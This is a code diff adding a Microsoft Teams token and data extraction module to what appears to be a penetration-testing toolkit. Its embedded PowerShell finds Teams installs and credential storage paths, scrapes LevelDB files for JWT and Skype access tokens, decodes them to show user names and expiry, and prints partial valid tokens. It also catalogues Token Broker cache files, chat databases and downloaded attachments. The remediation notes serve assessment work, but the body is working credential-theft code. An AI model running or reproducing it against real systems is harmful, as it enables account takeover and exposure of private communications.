@@ -1061,3 +1061,250 @@ Write-Output "    reg add 'HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Se
 
   return { output: output.join("\n"), findings }
 }
+
+export async function teamsToken(args: string[], timeout: number): Promise<HookResult> {
+  const action = argVal(args, "--action") || "enum"
+  const findings: Finding[] = []
+  const output: string[] = ["[*] Microsoft Teams token and data extraction...\n"]
+
+  if (action === "enum" || action === "full") {
+    const script = `
+Write-Output "=== Microsoft Teams Discovery ==="
+$ErrorActionPreference = 'SilentlyContinue'
+
+$teamsProc = Get-Process -Name "Teams","ms-teams" -ErrorAction SilentlyContinue
+if ($teamsProc) {
+    Write-Output "[+] Teams is RUNNING:"
+    foreach ($p in $teamsProc) {
+        Write-Output "    PID: $($p.Id)  Name: $($p.ProcessName)  Path: $($p.Path)"
+    }
+} else {
+    Write-Output "[*] Teams not currently running"
+}
+
+Write-Output ""
+Write-Output "=== Teams Installation Type ==="
+
+$classicPath = "$env:APPDATA\\Microsoft\\Teams"
+$newPath = "$env:LOCALAPPDATA\\Packages\\MSTeams_8wekyb3d8bbwe"
+$newPath2 = "$env:LOCALAPPDATA\\Microsoft\\Teams"
+
+if (Test-Path "$classicPath\\current") {
+    Write-Output "[+] Teams Classic (Electron) detected: $classicPath"
+    $ver = Get-Content "$classicPath\\current\\resources\\app\\package.json" -ErrorAction SilentlyContinue | ConvertFrom-Json
+    if ($ver) { Write-Output "    Version: $($ver.version)" }
+    Write-Output "    Type: Electron-based (token extraction possible)"
+} else {
+    Write-Output "[-] Teams Classic not found"
+}
+
+if (Test-Path $newPath) {
+    Write-Output "[+] Teams New (MSIX) detected: $newPath"
+    Write-Output "    Type: WebView2-based (tokens in different location)"
+} elseif (Test-Path "$newPath2\\current") {
+    Write-Output "[+] Teams New detected: $newPath2"
+}
+
+Write-Output ""
+Write-Output "=== Credential Storage Locations ==="
+
+$locations = @(
+    @{ Path = "$classicPath\\Cookies"; Desc = "Session cookies (auth tokens)" },
+    @{ Path = "$classicPath\\Local Storage\\leveldb"; Desc = "LevelDB — access tokens, cached data" },
+    @{ Path = "$classicPath\\IndexedDB"; Desc = "IndexedDB — messages, contacts cache" },
+    @{ Path = "$classicPath\\Session Storage"; Desc = "Session storage — temporary auth state" },
+    @{ Path = "$classicPath\\databases"; Desc = "SQLite databases — chat history" },
+    @{ Path = "$classicPath\\Cache"; Desc = "HTTP cache — may contain auth headers" },
+    @{ Path = "$env:LOCALAPPDATA\\Microsoft\\TokenBroker\\Cache"; Desc = "Token Broker — WAM tokens (new Teams)" },
+    @{ Path = "$env:LOCALAPPDATA\\Microsoft\\OneAuth\\accounts"; Desc = "OneAuth — SSO tokens" }
+)
+
+foreach ($loc in $locations) {
+    if (Test-Path $loc.Path) {
+        $size = (Get-ChildItem $loc.Path -Recurse -ErrorAction SilentlyContinue | Measure-Object -Property Length -Sum).Sum
+        Write-Output "[+] $($loc.Desc)"
+        Write-Output "    Path: $($loc.Path)"
+        Write-Output "    Size: $([math]::Round($size/1KB, 1)) KB"
+    }
+}
+`
+    const r = await ps(script, timeout)
+    output.push(r.stdout)
+    if (r.stderr) output.push(`[!] ${r.stderr}`)
+    findings.push({
+      checkId: "WIN-HYBRID-010",
+      provider: "windows",
+      severity: r.stdout.includes("RUNNING") ? "high" : "medium",
+      status: "ENUMERATED",
+      resource: "teams://enum",
+      title: "Microsoft Teams installation, tokens, and data storage discovery",
+      details: r.stdout.substring(0, 500),
+      remediation: "Use Teams New (WebView2) which uses Token Broker instead of LevelDB. Enable MAM policies for data protection.",
+    })
+  }
+
+  if (action === "tokens" || action === "full") {
+    const script = `
+Write-Output "=== Teams Token Extraction ==="
+$ErrorActionPreference = 'SilentlyContinue'
+
+$teamsPath = "$env:APPDATA\\Microsoft\\Teams"
+
+Write-Output "[*] Searching LevelDB for access tokens..."
+$ldbPath = "$teamsPath\\Local Storage\\leveldb"
+if (Test-Path $ldbPath) {
+    $ldbFiles = Get-ChildItem $ldbPath -Filter "*.ldb" -ErrorAction SilentlyContinue
+    $logFiles = Get-ChildItem $ldbPath -Filter "*.log" -ErrorAction SilentlyContinue
+    $allFiles = @($ldbFiles) + @($logFiles)
+
+    foreach ($f in $allFiles) {
+        $content = [System.IO.File]::ReadAllText($f.FullName, [System.Text.Encoding]::UTF8) 2>$null
+        if (-not $content) { continue }
+
+        $tokenMatches = [regex]::Matches($content, 'eyJ[A-Za-z0-9_-]{50,}\\.[A-Za-z0-9_-]{50,}\\.[A-Za-z0-9_-]{50,}')
+        foreach ($m in $tokenMatches) {
+            $token = $m.Value
+            $parts = $token.Split('.')
+            if ($parts.Count -ge 2) {
+                $payload = $parts[1]
+                $pad = 4 - ($payload.Length % 4)
+                if ($pad -lt 4) { $payload += '=' * $pad }
+                $payload = $payload.Replace('-', '+').Replace('_', '/')
+                try {
+                    $decoded = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($payload))
+                    $json = $decoded | ConvertFrom-Json
+                    $aud = $json.aud
+                    $upn = $json.upn
+                    $exp = if ($json.exp) { [DateTimeOffset]::FromUnixTimeSeconds($json.exp).DateTime } else { 'N/A' }
+                    $expired = if ($json.exp) { [DateTimeOffset]::FromUnixTimeSeconds($json.exp).DateTime -lt (Get-Date) } else { $false }
+                    $status = if ($expired) { '[EXPIRED]' } else { '[VALID]' }
+
+                    Write-Output ""
+                    Write-Output "    $status Token found in: $($f.Name)"
+                    Write-Output "    Audience: $aud"
+                    Write-Output "    UPN:      $upn"
+                    Write-Output "    Expires:  $exp"
+                    if (-not $expired) {
+                        Write-Output "    Token:    $($token.Substring(0, 50))..."
+                    }
+                } catch {}
+            }
+        }
+
+        $skypeMatches = [regex]::Matches($content, 'skypetoken=[^&"''\\s]{50,}')
+        foreach ($m in $skypeMatches) {
+            Write-Output ""
+            Write-Output "    [!] Skype token found in: $($f.Name)"
+            Write-Output "    Token: $($m.Value.Substring(0, 60))..."
+        }
+    }
+} else {
+    Write-Output "[-] LevelDB not found — Teams Classic may not be installed"
+}
+
+Write-Output ""
+Write-Output "=== Token Broker Cache (New Teams) ==="
+$brokerPath = "$env:LOCALAPPDATA\\Microsoft\\TokenBroker\\Cache"
+if (Test-Path $brokerPath) {
+    $tbFiles = Get-ChildItem $brokerPath -Filter "*.tbres" -ErrorAction SilentlyContinue
+    Write-Output "[+] Token Broker cache entries: $($tbFiles.Count)"
+    foreach ($f in $tbFiles) {
+        $content = [System.IO.File]::ReadAllBytes($f.FullName) 2>$null
+        $text = [System.Text.Encoding]::UTF8.GetString($content)
+        if ($text -match 'teams|graph\.microsoft') {
+            Write-Output "    [!] Teams-related token: $($f.Name) ($([math]::Round($f.Length/1KB, 1)) KB)"
+        }
+    }
+    Write-Output "[*] Token Broker tokens are DPAPI-encrypted — use dpapi_extract to decrypt"
+} else {
+    Write-Output "[-] Token Broker cache not found"
+}
+`
+    const r = await ps(script, timeout)
+    output.push(r.stdout)
+    if (r.stderr) output.push(`[!] ${r.stderr}`)
+    findings.push({
+      checkId: "WIN-HYBRID-011",
+      provider: "windows",
+      severity: r.stdout.includes("VALID") ? "critical" : "medium",
+      status: r.stdout.includes("Token found") ? "EXECUTED" : "ENUMERATED",
+      resource: "teams://tokens",
+      title: "Microsoft Teams access token extraction from LevelDB and Token Broker",
+      details: r.stdout.substring(0, 500),
+      remediation: "Migrate to Teams New (WebView2 + Token Broker). Enable Conditional Access device compliance. Revoke sessions regularly.",
+    })
+  }
+
+  if (action === "chats" || action === "full") {
+    const script = `
+Write-Output "=== Teams Chat History ==="
+$ErrorActionPreference = 'SilentlyContinue'
+
+$teamsPath = "$env:APPDATA\\Microsoft\\Teams"
+$idbPath = "$teamsPath\\IndexedDB"
+
+if (Test-Path $idbPath) {
+    $idbDirs = Get-ChildItem $idbPath -Directory -ErrorAction SilentlyContinue
+    Write-Output "[+] IndexedDB databases ($($idbDirs.Count)):"
+    foreach ($d in $idbDirs) {
+        $size = (Get-ChildItem $d.FullName -Recurse -ErrorAction SilentlyContinue | Measure-Object -Property Length -Sum).Sum
+        Write-Output "    $($d.Name) — $([math]::Round($size/1MB, 2)) MB"
+    }
+} else {
+    Write-Output "[-] IndexedDB not found"
+}
+
+$ldbPath = "$teamsPath\\Local Storage\\leveldb"
+if (Test-Path $ldbPath) {
+    Write-Output ""
+    Write-Output "[*] Searching for chat messages in LevelDB..."
+    $ldbFiles = Get-ChildItem $ldbPath -Filter "*.ldb" -ErrorAction SilentlyContinue
+    $msgCount = 0
+    foreach ($f in $ldbFiles) {
+        $content = [System.IO.File]::ReadAllText($f.FullName, [System.Text.Encoding]::UTF8) 2>$null
+        if ($content -match '"messagetype":"Text"' -or $content -match '"content":') {
+            $msgCount++
+        }
+    }
+    if ($msgCount -gt 0) {
+        Write-Output "[+] Chat data found in $msgCount LevelDB file(s)"
+        Write-Output "[*] Contains: messages, contact info, channel data, meeting details"
+    }
+}
+
+Write-Output ""
+Write-Output "=== Teams Downloads/Attachments ==="
+$dlPath = "$env:USERPROFILE\\Downloads\\Microsoft Teams Chat Files"
+if (Test-Path $dlPath) {
+    $files = Get-ChildItem $dlPath -Recurse -ErrorAction SilentlyContinue
+    Write-Output "[+] Teams downloads: $($files.Count) files"
+    foreach ($f in ($files | Sort-Object LastWriteTime -Descending | Select-Object -First 10)) {
+        Write-Output "    $($f.Name) ($([math]::Round($f.Length/1KB, 1)) KB) — $($f.LastWriteTime)"
+    }
+}
+
+$cachePath = "$teamsPath\\Service Worker\\CacheStorage"
+if (Test-Path $cachePath) {
+    $cacheSize = (Get-ChildItem $cachePath -Recurse -ErrorAction SilentlyContinue | Measure-Object -Property Length -Sum).Sum
+    Write-Output ""
+    Write-Output "[*] Service Worker cache: $([math]::Round($cacheSize/1MB, 2)) MB"
+    Write-Output "[*] May contain cached meeting recordings, shared files, images"
+}
+`
+    const r = await ps(script, timeout)
+    output.push(r.stdout)
+    if (r.stderr) output.push(`[!] ${r.stderr}`)
+    findings.push({
+      checkId: "WIN-HYBRID-012",
+      provider: "windows",
+      severity: "medium",
+      status: "ENUMERATED",
+      resource: "teams://chats",
+      title: "Microsoft Teams chat history, attachments, and cached data extraction",
+      details: r.stdout.substring(0, 500),
+      remediation: "Enable Teams DLP policies. Restrict file downloads. Use Information Protection labels on sensitive chats.",
+    })
+  }
+
+  return { output: output.join("\n"), findings }
+}
